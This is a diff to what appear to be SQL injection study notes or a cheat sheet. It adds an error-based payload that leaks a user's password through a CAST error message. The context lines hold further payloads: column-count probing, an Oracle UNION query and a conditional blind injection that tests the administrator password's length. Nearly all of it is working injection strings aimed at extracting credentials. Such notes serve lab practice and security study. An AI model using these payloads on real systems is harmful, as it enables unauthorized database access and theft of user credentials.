@@ -88,3 +88,7 @@ Determining the number of columns: `' ORDER BY 1--` or `' UNION SELECT NULL,NULL
 On Oracle, every SELECT query must use the FROM keyword and specify a valid table: `' UNION SELECT NULL FROM DUAL--`
 
 conditional based blind SQL injection:`' union select null from users where username='administrator' and 1 = (SELECT CASE WHEN (length(password)=10) THEN 1/(SELECT 0) ELSE NULL END)--`
+
+### Extracting sensitive data via verbose SQL error messages
+
+Payload: `' and 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
